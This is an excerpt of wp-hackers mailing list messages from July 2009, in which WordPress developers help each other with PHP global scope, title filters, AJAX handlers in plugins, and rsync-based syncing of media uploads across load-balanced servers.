> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   

From adamjctaylor at gmail.com  Tue Jul 28 16:49:58 2009
From: adamjctaylor at gmail.com (Adam Taylor)
Date: Tue, 28 Jul 2009 17:49:58 +0100
Subject: [wp-hackers] register_activation_hook() problem
In-Reply-To: <674b4a3b0907280918i5c9f1aeek468eb31c1aa065b6@mail.gmail.com>
References: <d0cdc35c0907280230i12fbd270v99bf1060cf8352c2@mail.gmail.com> 
	<674b4a3b0907280256s2294b019qfa079b5b9277dd67@mail.gmail.com> 
	<4A6F0369.6000802@poplarware.com>
	<d0cdc35c0907280756m597b1075mc238dc0ded0f2ce9@mail.gmail.com> 
	<4A6F1F43.4080709@gaarai.com>
	<d0cdc35c0907280901r7deccdbfuc65411f76d4abdb8@mail.gmail.com> 
	<674b4a3b0907280918i5c9f1aeek468eb31c1aa065b6@mail.gmail.com>
Message-ID: <d0cdc35c0907280949o32c1a6d5h9505584cfe7c768c@mail.gmail.com>

On Tue, Jul 28, 2009 at 5:18 PM, Austin Matzko <if.website at gmail.com> wrote:

> On Tue, Jul 28, 2009 at 11:01 AM, Adam Taylor<adamjctaylor at gmail.com>
> wrote:
> > I'm pretty sure I haven't defined the function more than once.. the whole
> > code is here:
> >
> > http://pastebin.com/m1feb2d16
>
> The problem is that the createDatabaseTables() method calls
> $wpdb->get_var() without declaring $wpdb as a global variable, so the
> error is calling a method that doesn't exist.


Thanks very much that has fixed that problem.

From adamjctaylor at gmail.com  Tue Jul 28 16:50:44 2009
From: adamjctaylor at gmail.com (Adam Taylor)
Date: Tue, 28 Jul 2009 17:50:44 +0100
Subject: [wp-hackers] register_activation_hook() problem
In-Reply-To: <4A6F2578.4050100@gaarai.com>
References: <d0cdc35c0907280230i12fbd270v99bf1060cf8352c2@mail.gmail.com> 
	<674b4a3b0907280256s2294b019qfa079b5b9277dd67@mail.gmail.com> 
	<4A6F0369.6000802@poplarware.com>
	<d0cdc35c0907280756m597b1075mc238dc0ded0f2ce9@mail.gmail.com> 
	<4A6F1F43.4080709@gaarai.com>
	<d0cdc35c0907280901r7deccdbfuc65411f76d4abdb8@mail.gmail.com> 
	<4A6F2578.4050100@gaarai.com>
Message-ID: <d0cdc35c0907280950j22674883h39353a14cf02f77f@mail.gmail.com>

Cheers for the extremely thorough heads-up on globals - I shall go read that
link.

Thanks,
Adam

On Tue, Jul 28, 2009 at 5:21 PM, Chris Jean <gaarai at gaarai.com> wrote:

> In that code, I did not see a redefinition. However, if you have other
> plugins, theme mods, etc that define that function, you will still have
> problems. Keep in mind that redefinition isn't limited to a file, it
> applies to all code that runs.
>
> Looking at your code, it is clear that you still need to learn how
> globals work. The code fatally failed because you didn't have "global
> $wpdb" inside the createDatabaseTables function. Also, thumbs_install,
> thumbs_init, and process_vote will not use the $thumbs global thumbs var
> as you want since the global var is not localized to the functions.
>
> Scope is really odd in PHP; frankly, I don't like how it works. So,
> forget everything you knew about scope in other languages and learn how
> PHP does it.
>
> When you create a function, you create a new scope completely-unique to
> that function. Nothing exists to that function except what is passed to
> it as an argument or what is created inside of it. Even though a
> variable may be global, it does not exist inside any function.
>
> The way you bring a global into the function is to use the global
> keyword to bring the global variable into the function's scope.
>
> For example, doing the following will not work:
>
>    global $var;
>    $var = "Hello!\n";
>    test();
>
>    function test() {
>        echo $var;
>    }
>
> The function test creates a new empty variable called $var and echoes
> it's value rather than using the global. Running the code will result in
> a warning: "PHP Notice:  Undefined variable: var in ..."
>
> This is the right way to do it:
>
>    global $var;
>    $var = "Hello!\n";
>    test();
>
>    function test() {
>        global $var;
>        echo $var;
>    }
>
> You can read more on globals here: http://bit.ly/18fGqF
>
> With all this said, I recommend that you avoid globals if you can.
> Passing variables as arguments or storing them in objects is a
> less-confusing and less bug-prone way of doing things.
>
> Chris Jean
> http://gaarai.com/
> http://wp-roadmap.com/
> http://dnsyogi.com/
>
>
>
> Adam Taylor wrote:
> > On Tue, Jul 28, 2009 at 4:54 PM, Chris Jean <gaarai at gaarai.com> wrote:
> >
> >
> >> Your error is caused by the fact that the thumbs_install function is
> >> being redeclared, not by your use of the global declaration. You can
> >> only define a function once, attempting to do so again will result in an
> >> error.
> >>
> >>
> >
> > I'm pretty sure I haven't defined the function more than once.. the whole
> > code is here:
> >
> > http://pastebin.com/m1feb2d16
> >
> > If that helps anyone help me..
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
adamjctaylor at gmail.com
http://www.twitter.com/adamtaylor

From jeremy at visser.name  Wed Jul 29 00:56:51 2009
From: jeremy at visser.name (Jeremy Visser)
Date: Wed, 29 Jul 2009 10:56:51 +1000
Subject: [wp-hackers] register_activation_hook() problem
In-Reply-To: <4A6F2578.4050100@gaarai.com>
References: <d0cdc35c0907280230i12fbd270v99bf1060cf8352c2@mail.gmail.com>
	<674b4a3b0907280256s2294b019qfa079b5b9277dd67@mail.gmail.com>
	<4A6F0369.6000802@poplarware.com>
	<d0cdc35c0907280756m597b1075mc238dc0ded0f2ce9@mail.gmail.com>
	<4A6F1F43.4080709@gaarai.com>
	<d0cdc35c0907280901r7deccdbfuc65411f76d4abdb8@mail.gmail.com>
	<4A6F2578.4050100@gaarai.com>
Message-ID: <1248829011.4489.6.camel@rillian.narnia.sunriseroad.net>

On Tue, 2009-07-28 at 11:21 -0500, Chris Jean wrote:
> Scope is really odd in PHP; frankly, I don't like how it works. So,
> forget everything you knew about scope in other languages and learn how
> PHP does it.
> 
> When you create a function, you create a new scope completely-unique to
> that function. Nothing exists to that function except what is passed to
> it as an argument or what is created inside of it. Even though a
> variable may be global, it does not exist inside any function.
> 
> The way you bring a global into the function is to use the global
> keyword to bring the global variable into the function's scope.

Not that this is of much relevance, but I've been coding in Python
lately, and it has the same characteristics, but with an additional
twist:

Global variables may be accessed from within a function without being
declared as such, but as soon as you try to assign a value to the
variable, it instantly becomes local scope, and doesn't affect the
global version. So you need to declare with with a "global myvar"
statement.

And it gets even hairier. Only assignment to global variables (e.g. "x =
25") is affected. If you have a list (basically synonymous with an array
in PHP, except only numeric keys are accepted), e.g. my_list = ['tom',
'dick', 'harry'], you can use the append() function of the list, e.g.
my_list.append('john') without declaring global, but then you try to
assign a new list, e.g. my_list = ['judith', 'bertha', 'gladys'], it
will then become local scope and will create weird errors.

That said, Python is still a great language. But I don't like Django. :(


From wordpress at santosj.name  Wed Jul 29 01:15:34 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Tue, 28 Jul 2009 20:15:34 -0500
Subject: [wp-hackers] register_activation_hook() problem
In-Reply-To: <1248829011.4489.6.camel@rillian.narnia.sunriseroad.net>
References: <d0cdc35c0907280230i12fbd270v99bf1060cf8352c2@mail.gmail.com>
	<674b4a3b0907280256s2294b019qfa079b5b9277dd67@mail.gmail.com>
	<4A6F0369.6000802@poplarware.com>
	<d0cdc35c0907280756m597b1075mc238dc0ded0f2ce9@mail.gmail.com>
	<4A6F1F43.4080709@gaarai.com>
	<d0cdc35c0907280901r7deccdbfuc65411f76d4abdb8@mail.gmail.com>
	<4A6F2578.4050100@gaarai.com>
	<1248829011.4489.6.camel@rillian.narnia.sunriseroad.net>
Message-ID: <20090728201534.9b1864ae.wordpress@santosj.name>

Yeah, this thread is filled with WTF?s. It is like GOTOs, you can use them, but the language is going to kick your ass for doing so. Well, *you* should never use GOTO and I'm talking to you Adam.

Python is telling you that you shouldn't be using globals. You shouldn't be using globals in PHP. It is a shame really that WordPress uses them so much in the code. With PHP4 support, it is difficult to get around it, but not impossible. I think the Registry Pattern tries to get around it, but I'm unsure whether the additional complexity outweighs the benefit of not using globals. 

Globals in and of themselves aren't evil. I guess it is similar to the bad rep that GOTO gets, in that people use them because they are convenient and not for the few instances they legitimately should be used in code.

The reason functions have that scope is because a new stack is created for it. The purpose of a function would be defeated if every variable that exists is passed to the function (would it be the same as using GOTO?, just less WTF?). It is pretty tricky in programming languages, in that one aspect of them is that they require you do a bit of work and understand the fundamentals of programming.

Jacob Santos


On Wed, 29 Jul 2009 10:56:51 +1000
Jeremy Visser <jeremy at visser.name> wrote:

> On Tue, 2009-07-28 at 11:21 -0500, Chris Jean wrote:
> > Scope is really odd in PHP; frankly, I don't like how it works. So,
> > forget everything you knew about scope in other languages and learn how
> > PHP does it.
> > 
> > When you create a function, you create a new scope completely-unique to
> > that function. Nothing exists to that function except what is passed to
> > it as an argument or what is created inside of it. Even though a
> > variable may be global, it does not exist inside any function.
> > 
> > The way you bring a global into the function is to use the global
> > keyword to bring the global variable into the function's scope.
> 
> Not that this is of much relevance, but I've been coding in Python
> lately, and it has the same characteristics, but with an additional
> twist:
> 
> Global variables may be accessed from within a function without being
> declared as such, but as soon as you try to assign a value to the
> variable, it instantly becomes local scope, and doesn't affect the
> global version. So you need to declare with with a "global myvar"
> statement.
> 
> And it gets even hairier. Only assignment to global variables (e.g. "x =
> 25") is affected. If you have a list (basically synonymous with an array
> in PHP, except only numeric keys are accepted), e.g. my_list = ['tom',
> 'dick', 'harry'], you can use the append() function of the list, e.g.
> my_list.append('john') without declaring global, but then you try to
> assign a new list, e.g. my_list = ['judith', 'bertha', 'gladys'], it
> will then become local scope and will create weird errors.
> 
> That said, Python is still a great language. But I don't like Django. :(
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


-- 
Jacob Santos <wordpress at santosj.name>


From bruno.in.dk at gmail.com  Wed Jul 29 06:38:21 2009
From: bruno.in.dk at gmail.com (Bruno Alexandre)
Date: Wed, 29 Jul 2009 08:38:21 +0200
Subject: [wp-hackers] Hooks, Actions, Filters
Message-ID: <aa12c8990907282338y168194far850e3c5b60c2a34c@mail.gmail.com>

Howdy Guys,
I'm quite new to this,m and I wanted to understand the Hooks and Filters
better, I can't get it right from Codex.

I did a simple test,

the idea is to override the get_title() method in order to erase the
"Protected: " sentence from the title if the page is protected, there is a
protected_title_format filter, and I thought using it ...


that line in post-template.php specifies:

$protected_title_format = apply_filters('protected_title_format',
__('Protected: %s'));


for what I could get from CODEX, I need to remove that filter and add my
own, like


remove_action('protected_title_format');
apply_filters('protected_title_format', __('MY OWN PAGE Protected: %s'));

using, off course something like


// Removing action function remove_title_action() {
remove_action('protected_title_format','get_the_title',3); }
add_action('init','remove_title_action'); // Adding custom function
add_action('protected_title_format','fancy_title', 3, 4); function
fancy_title($id = 0) { $post = &get_post($id); $title = $post->post_title;
echo "I'm the king of the world!... >" . $title . "< & >" . $post . "<"; if
( !is_admin() ) { if ( !empty($post->post_password) ) {
$protected_title_format = apply_filters('protected_title_format', __('MY OWN
PAGE Protected: %s')); $title = sprintf($protected_title_format, $title); }
} return apply_filters( 'the_title', $title, $post->ID ); }



I can get the echo to output, but I dont get the $id, this method is a copy
of get_title() stripping out everything but the protected part


Can anyone care to explain me how this works?
Thank you

Bruno Alexandre
[web] www.balexandre.com
[twitter] http://twitter.com/balexandre


Jonathan Swift<http://www.brainyquote.com/quotes/authors/j/jonathan_swift.html>
- "May you live every day of your life."

From jeremy at visser.name  Wed Jul 29 10:20:42 2009
From: jeremy at visser.name (Jeremy Visser)
Date: Wed, 29 Jul 2009 20:20:42 +1000
Subject: [wp-hackers] Hooks, Actions, Filters
In-Reply-To: <aa12c8990907282338y168194far850e3c5b60c2a34c@mail.gmail.com>
References: <aa12c8990907282338y168194far850e3c5b60c2a34c@mail.gmail.com>
Message-ID: <1248862842.4489.14.camel@rillian.narnia.sunriseroad.net>

On Wed, 2009-07-29 at 08:38 +0200, Bruno Alexandre wrote:
> the idea is to override the get_title() method in order to erase the
> "Protected: " sentence from the title if the page is protected, there is a
> protected_title_format filter, and I thought using it ...

> $protected_title_format = apply_filters('protected_title_format',
> __('Protected: %s'));

What you need is something like this:

        function remove_protected_title_format($s) {
                return str_replace('Protected: ', '', $s);
        }
        
        add_filter('protected_title_format',
          'remove_protected_title_format');

To help you understand it, look at the original code:

        $protected_title_format =
          apply_filters('protected_title_format', __('Protected: %s'));

So the string is *starting out* as 'Protected: %s'. We can't change
that, because that is what is fed into the filter. However, we can
change it after it has been fed into the filter. So...

[Start]		$protected_title_format = 'Protected: %s'
[Apply filters]	call remove_protected_title_format()
		  -- strips out 'Protected: ' of variable
[Finish]	$protected_title_format = '%s'

And that is what gets ultimately assigned to the variable.

Hope this helps,
Jeremy.


From adamjctaylor at gmail.com  Wed Jul 29 10:26:32 2009
From: adamjctaylor at gmail.com (Adam Taylor)
Date: Wed, 29 Jul 2009 11:26:32 +0100
Subject: [wp-hackers] ajax and $wpdb
Message-ID: <d0cdc35c0907290326o6f4100d4ve3af9ff8df5d9a2@mail.gmail.com>

Hi All,

I'm using AJAX to call my plugin script to process data and update what is
displayed (essentially a thumbs up/thumbs down voting plugin).  This is
fine, I can update the text but I need to also interact with the database.

As I understand, because I am calling my script directly not from within
wordpress $wpdb is not available.

I read that you can include wp-blog-header.php and everything should be
available and have added - require_once('../../../wp-blog-header.php');  -
to the function requiring it, however, I get the following error:

PHP Fatal error:  Call to a member function set_prefix() on a non-object in
/dev/site/wp-settings.php on line 255

Firstly: what's going on here and how can I fix it?

Secondly: is this the best way of doing this? I can't find any tutorials or
documents about writing an ajaxy plugin for wordpress that interacts with
the database. This topic http://wordpress.org/support/topic/184095 suggests
that it is not but I don't understand the suggested solutions.

Thanks in advance,
Adam

-- 
adamjctaylor at gmail.com
http://www.twitter.com/adamtaylor

From adamjctaylor at gmail.com  Wed Jul 29 10:41:17 2009
From: adamjctaylor at gmail.com (Adam Taylor)
Date: Wed, 29 Jul 2009 11:41:17 +0100
Subject: [wp-hackers] ajax and $wpdb
In-Reply-To: <d0cdc35c0907290326o6f4100d4ve3af9ff8df5d9a2@mail.gmail.com>
References: <d0cdc35c0907290326o6f4100d4ve3af9ff8df5d9a2@mail.gmail.com>
Message-ID: <d0cdc35c0907290341l1f327299kc7ab61622a6ee44d@mail.gmail.com>

Ok I've resolved my first question but my second question still stands.

Adam

-- 
adamjctaylor at gmail.com
http://www.twitter.com/adamtaylor

From scribu at gmail.com  Wed Jul 29 11:23:27 2009
From: scribu at gmail.com (scribu)
Date: Wed, 29 Jul 2009 14:23:27 +0300
Subject: [wp-hackers] ajax and $wpdb
In-Reply-To: <d0cdc35c0907290341l1f327299kc7ab61622a6ee44d@mail.gmail.com>
References: <d0cdc35c0907290326o6f4100d4ve3af9ff8df5d9a2@mail.gmail.com>
	<d0cdc35c0907290341l1f327299kc7ab61622a6ee44d@mail.gmail.com>
Message-ID: <349fe48b0907290423x19258996v7c93e361a1a4c260@mail.gmail.com>

On Wed, Jul 29, 2009 at 1:41 PM, Adam Taylor <adamjctaylor at gmail.com> wrote:

> Secondly: is this the best way of doing this? I can't find any tutorials or
> documents about writing an ajaxy plugin for wordpress that interacts with
> the database.


Definetly not the best way. I would send you to this page, but it's
outdated, unfortunately: http://codex.wordpress.org/AJAX_in_Plugins

Basically, instead of calling a script directly, you should do this:

For logged-in users:

add_action('wp_ajax_my_action', 'my_ajax_handler');

For the public:

add_action('wp_ajax_nopriv_my_action', 'my_ajax_handler');


The js should look something like this:

jQuery.post(<?php echo admin_url('admin_ajax.php'); ?>, {action:
'my_action', foo: 'bar'});


And the php:

function my_ajax_handler() {
  var_dump($_POST);
}


That's about it.


-- 
http://scribu.net

From spellham at gmail.com  Wed Jul 29 14:00:09 2009
From: spellham at gmail.com (Steve Pellham)
Date: Wed, 29 Jul 2009 09:00:09 -0500
Subject: [wp-hackers] Load Balancing | Media Uploads to Multiple Servers
Message-ID: <b6a9375d0907290700j6a7d5b95v4146b8c3ca7844e9@mail.gmail.com>

Is anyone aware of an existing plugin for the post editor pages and/or media
gallery that would push uploaded media (images, video, etc....) to multiple
servers in cases where a WP installation is load balanced?

DB changes are handled via local and wan replication, but I'm looking for a
solution for keeping other media in sync as new images/videos are added to
the gallery, inside posts, etc...  I can think of ways to accomplish this
(ftp, rsync...), but I haven't yet found an existing plugin for this.  Don't
want to reinvent the wheel unless absolutely necessary.

Thanks, Steve

From simon at sweetinteraction.com  Wed Jul 29 14:02:14 2009
From: simon at sweetinteraction.com (Simon Wheatley)
Date: Wed, 29 Jul 2009 15:02:14 +0100
Subject: [wp-hackers] Load Balancing | Media Uploads to Multiple Servers
In-Reply-To: <b6a9375d0907290700j6a7d5b95v4146b8c3ca7844e9@mail.gmail.com>
References: <b6a9375d0907290700j6a7d5b95v4146b8c3ca7844e9@mail.gmail.com>
Message-ID: <77c8b7bf0907290702t6aaa7d26kc8fb30ed12d8955d@mail.gmail.com>

The load balanced solution I'm deploying to as I type has file syncing
in the OS File System. Perhaps worth looking at as well as a WP
solution?

S


On Wed, Jul 29, 2009 at 3:00 PM, Steve Pellham<spellham at gmail.com> wrote:
> Is anyone aware of an existing plugin for the post editor pages and/or media
> gallery that would push uploaded media (images, video, etc....) to multiple
> servers in cases where a WP installation is load balanced?
>
> DB changes are handled via local and wan replication, but I'm looking for a
> solution for keeping other media in sync as new images/videos are added to
> the gallery, inside posts, etc... ?I can think of ways to accomplish this
> (ftp, rsync...), but I haven't yet found an existing plugin for this. ?Don't
> want to reinvent the wheel unless absolutely necessary.
>
> Thanks, Steve
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Simon Wheatley
Sweet Interaction Ltd
Web Interaction Design & Development
Tel: 07971 687295

Consulting for Stephen Fry: http://stephenfry.com/
Blog functionality for DfID - http://blogs.dfid.gov.uk/
House of Illustration site - http://houseofillustration.org.uk/
Blog for the Royal Navy - http://jackspeak.royalnavy.mod.uk/

---
Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
Registered office: 7 Malton Av, Manchester, M21 8AT

From tim at silentgap.com  Wed Jul 29 14:20:49 2009
From: tim at silentgap.com (Tim Schoffelman)
Date: Wed, 29 Jul 2009 09:20:49 -0500
Subject: [wp-hackers] Load Balancing | Media Uploads to Multiple Servers
In-Reply-To: <77c8b7bf0907290702t6aaa7d26kc8fb30ed12d8955d@mail.gmail.com>
References: <b6a9375d0907290700j6a7d5b95v4146b8c3ca7844e9@mail.gmail.com>
	<77c8b7bf0907290702t6aaa7d26kc8fb30ed12d8955d@mail.gmail.com>
Message-ID: <5b1aecc0907290720v7646a04bs1bf420a9be4a7173@mail.gmail.com>

We have a current system that does this very thing. Basically, the servers
we run are using a *nix type OS and we just RSYNC the wp-content/uploads
directory w/ our backups. This solution has worked really well for us. We've
messed around with a few other plugin ideas, but found that this one suited
our needs the best. I'm interested in seeing other solutions though.
~tim


On Wed, Jul 29, 2009 at 9:02 AM, Simon Wheatley
<simon at sweetinteraction.com>wrote:

> The load balanced solution I'm deploying to as I type has file syncing
> in the OS File System. Perhaps worth looking at as well as a WP
> solution?
>
> S
>
>
> On Wed, Jul 29, 2009 at 3:00 PM, Steve Pellham<spellham at gmail.com> wrote:
> > Is anyone aware of an existing plugin for the post editor pages and/or
> media
> > gallery that would push uploaded media (images, video, etc....) to
> multiple
> > servers in cases where a WP installation is load balanced?
> >
> > DB changes are handled via local and wan replication, but I'm looking for
> a
> > solution for keeping other media in sync as new images/videos are added
> to
> > the gallery, inside posts, etc...  I can think of ways to accomplish this
> > (ftp, rsync...), but I haven't yet found an existing plugin for this.
>  Don't
> > want to reinvent the wheel unless absolutely necessary.
> >
> > Thanks, Steve
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
>
> --
> Simon Wheatley
> Sweet Interaction Ltd
> Web Interaction Design & Development
> Tel: 07971 687295
>
> Consulting for Stephen Fry: http://stephenfry.com/
> Blog functionality for DfID - http://blogs.dfid.gov.uk/
> House of Illustration site - http://houseofillustration.org.uk/
> Blog for the Royal Navy - http://jackspeak.royalnavy.mod.uk/
>
> ---
> Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
> Registered office: 7 Malton Av, Manchester, M21 8AT
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From yahgrp at poplarware.com  Wed Jul 29 14:32:27 2009
From: yahgrp at poplarware.com (Jennifer Hodgdon)
Date: Wed, 29 Jul 2009 07:32:27 -0700
Subject: [wp-hackers] ajax and $wpdb
In-Reply-To: <349fe48b0907290423x19258996v7c93e361a1a4c260@mail.gmail.com>
References: <d0cdc35c0907290326o6f4100d4ve3af9ff8df5d9a2@mail.gmail.com>	<d0cdc35c0907290341l1f327299kc7ab61622a6ee44d@mail.gmail.com>
	<349fe48b0907290423x19258996v7c93e361a1a4c260@mail.gmail.com>
Message-ID: <4A705D7B.5020001@poplarware.com>

scribu wrote:
> On Wed, Jul 29, 2009 at 1:41 PM, Adam Taylor <adamjctaylor at gmail.com> wrote:
> 
>> Secondly: is this the best way of doing this? I can't find any tutorials or
>> documents about writing an ajaxy plugin for wordpress that interacts with
>> the database.
> 
> 
> Definetly not the best way. I would send you to this page, but it's
> outdated, unfortunately: http://codex.wordpress.org/AJAX_in_Plugins
> 
> Basically, instead of calling a script directly, you should do this:
> 
> For logged-in users:
> 
> add_action('wp_ajax_my_action', 'my_ajax_handler');
> 
> For the public:
> 
> add_action('wp_ajax_nopriv_my_action', 'my_ajax_handler');

When did this come in to WordPress? That Codex page was written in an 
era when you couldn't do AJAX in a standardized way outside of the 
admin screens.

     --Jennifer

-- 
Jennifer Hodgdon * Poplar ProductivityWare
www.poplarware.com
Drupal, WordPress, and custom Web programming


From otto at ottodestruct.com  Wed Jul 29 14:54:12 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 29 Jul 2009 09:54:12 -0500
Subject: [wp-hackers] ajax and $wpdb
In-Reply-To: <4A705D7B.5020001@poplarware.com>
References: <d0cdc35c0907290326o6f4100d4ve3af9ff8df5d9a2@mail.gmail.com> 
	<d0cdc35c0907290341l1f327299kc7ab61622a6ee44d@mail.gmail.com> 
	<349fe48b0907290423x19258996v7c93e361a1a4c260@mail.gmail.com> 
	<4A705D7B.5020001@poplarware.com>
Message-ID: <161617690907290754i3f21b411ta186c4e7b2f00e1e@mail.gmail.com>

On Wed, Jul 29, 2009 at 9:32 AM, Jennifer Hodgdon<yahgrp at poplarware.com> wrote:
> When did this come in to WordPress? That Codex page was written in an era
> when you couldn't do AJAX in a standardized way outside of the admin
> screens.

The nopriv stuff got added 5 months ago, here:
http://core.trac.wordpress.org/changeset/10720

-Otto

From spellham at gmail.com  Wed Jul 29 14:56:24 2009
From: spellham at gmail.com (Steve Pellham)
Date: Wed, 29 Jul 2009 09:56:24 -0500
Subject: [wp-hackers] Load Balancing | Media Uploads to Multiple Servers
In-Reply-To: <5b1aecc0907290720v7646a04bs1bf420a9be4a7173@mail.gmail.com>
References: <b6a9375d0907290700j6a7d5b95v4146b8c3ca7844e9@mail.gmail.com>
	<77c8b7bf0907290702t6aaa7d26kc8fb30ed12d8955d@mail.gmail.com>
	<5b1aecc0907290720v7646a04bs1bf420a9be4a7173@mail.gmail.com>
Message-ID: <b6a9375d0907290756j288ddf8bh48f5ab4c0be03b3e@mail.gmail.com>

Thanks for the responses.  RSYNC is the solution that we were looking into,
but my concern is the update frequency.   It would be overly simple to sync
the directories once per day, but if the sync is not immediate, the concern
is that a post would render without its associated images.    I'm looking
for a real-time upload sync solution where the files are pushed out to 1 or
more remote servers as the file is uploaded.

Therefore the question about a plugin that triggers the file push as content
is uploaded, I'm envisioning something like this.

1. create new post
2. upload image - this should trigger a server process (rsync, ssh, scp,
rsh, rcp) that pushes the file to additional servers real-time.
3. view post on any available servers (with full content, images, etc..) in
the LB pool.

I understand that a nightly sync may work in cases where backup servers were
used strictly for failover, but not in a real-time load balancing scenario
where all servers should have updated content at the time (or very shortly
after) it was uploaded.

We will have to build a solution for this both inside and external of WP
anyway since the site is custom and WP only runs our blog.




On Wed, Jul 29, 2009 at 9:20 AM, Tim Schoffelman <tim at silentgap.com> wrote:

> We have a current system that does this very thing. Basically, the servers
> we run are using a *nix type OS and we just RSYNC the wp-content/uploads
> directory w/ our backups. This solution has worked really well for us.
> We've
> messed around with a few other plugin ideas, but found that this one suited
> our needs the best. I'm interested in seeing other solutions though.
> ~tim
>
>
> On Wed, Jul 29, 2009 at 9:02 AM, Simon Wheatley
> <simon at sweetinteraction.com>wrote:
>
> > The load balanced solution I'm deploying to as I type has file syncing
> > in the OS File System. Perhaps worth looking at as well as a WP
> > solution?
> >
> > S
> >
> >
> > On Wed, Jul 29, 2009 at 3:00 PM, Steve Pellham<spellham at gmail.com>
> wrote:
> > > Is anyone aware of an existing plugin for the post editor pages and/or
> > media
> > > gallery that would push uploaded media (images, video, etc....) to
> > multiple
> > > servers in cases where a WP installation is load balanced?
> > >
> > > DB changes are handled via local and wan replication, but I'm looking
> for
> > a
> > > solution for keeping other media in sync as new images/videos are added
> > to
> > > the gallery, inside posts, etc...  I can think of ways to accomplish
> this
> > > (ftp, rsync...), but I haven't yet found an existing plugin for this.
> >  Don't
> > > want to reinvent the wheel unless absolutely necessary.
> > >
> > > Thanks, Steve
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> >
> >
> >
> > --
> > Simon Wheatley
> > Sweet Interaction Ltd
> > Web Interaction Design & Development
> > Tel: 07971 687295
> >
> > Consulting for Stephen Fry: http://stephenfry.com/
> > Blog functionality for DfID - http://blogs.dfid.gov.uk/
> > House of Illustration site - http://houseofillustration.org.uk/
> > Blog for the Royal Navy - http://jackspeak.royalnavy.mod.uk/
> >
> > ---
> > Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
> > Registered office: 7 Malton Av, Manchester, M21 8AT
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From spellham at gmail.com  Wed Jul 29 14:58:26 2009
From: spellham at gmail.com (Steve Pellham)
Date: Wed, 29 Jul 2009 09:58:26 -0500
Subject: [wp-hackers] Load Balancing | Media Uploads to Multiple Servers
In-Reply-To: <77c8b7bf0907290702t6aaa7d26kc8fb30ed12d8955d@mail.gmail.com>
References: <b6a9375d0907290700j6a7d5b95v4146b8c3ca7844e9@mail.gmail.com>
	<77c8b7bf0907290702t6aaa7d26kc8fb30ed12d8955d@mail.gmail.com>
Message-ID: <b6a9375d0907290758t5c9cc08eq2f44b4be1ace969a@mail.gmail.com>

Simon, is the sync real-time as content is uploaded or nightly (or other
frequency) as suggested by Tim?

Tim - if you only update nightly... are your servers used for backup only or
real-time load balancing?  Again, the concern is viewing a post on a server
where an image is not available.

On Wed, Jul 29, 2009 at 9:02 AM, Simon Wheatley
<simon at sweetinteraction.com>wrote:

> The load balanced solution I'm deploying to as I type has file syncing
> in the OS File System. Perhaps worth looking at as well as a WP
> solution?
>
> S
>
>
> On Wed, Jul 29, 2009 at 3:00 PM, Steve Pellham<spellham at gmail.com> wrote:
> > Is anyone aware of an existing plugin for the post editor pages and/or
> media
> > gallery that would push uploaded media (images, video, etc....) to
> multiple
> > servers in cases where a WP installation is load balanced?
> >
> > DB changes are handled via local and wan replication, but I'm looking for
> a
> > solution for keeping other media in sync as new images/videos are added
> to
> > the gallery, inside posts, etc...  I can think of ways to accomplish this
> > (ftp, rsync...), but I haven't yet found an existing plugin for this.
>  Don't
> > want to reinvent the wheel unless absolutely necessary.
> >
> > Thanks, Steve
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
>
> --
> Simon Wheatley
> Sweet Interaction Ltd
> Web Interaction Design & Development
> Tel: 07971 687295
>
> Consulting for Stephen Fry: http://stephenfry.com/
> Blog functionality for DfID - http://blogs.dfid.gov.uk/
> House of Illustration site - http://houseofillustration.org.uk/
> Blog for the Royal Navy - http://jackspeak.royalnavy.mod.uk/
>
> ---
> Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
> Registered office: 7 Malton Av, Manchester, M21 8AT
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From tim at silentgap.com  Wed Jul 29 15:33:34 2009
From: tim at silentgap.com (Tim Schoffelman)
Date: Wed, 29 Jul 2009 10:33:34 -0500
Subject: [wp-hackers] Load Balancing | Media Uploads to Multiple Servers
In-Reply-To: <b6a9375d0907290758t5c9cc08eq2f44b4be1ace969a@mail.gmail.com>
References: <b6a9375d0907290700j6a7d5b95v4146b8c3ca7844e9@mail.gmail.com>
	<77c8b7bf0907290702t6aaa7d26kc8fb30ed12d8955d@mail.gmail.com>
	<b6a9375d0907290758t5c9cc08eq2f44b4be1ace969a@mail.gmail.com>
Message-ID: <5b1aecc0907290833v52d7e3fexcb4f4e3b24206fc@mail.gmail.com>

Actually, I think (and I'm not the sysadmin but the developer) our rsync set
up functions differently than what was communicated earlier (previous
intention was to paint a picture of the benifits of rsync, but since it
seems we all know that now, I can probably explain further). The description
below "should" help paint a clear (or atleast better) picture.
Right now we have a 2-Way sync set up.

1) Common Sync dir (On Disk Copy)

/....../sync-uploads/$siteName/PATH

on our Admin box a symbolic link will be created from the "upload dir" to
the sync-uploads dir.  All uploaded content will live in sync-uploads and
will sync (single RSYNC) to the NFS mount.

Example

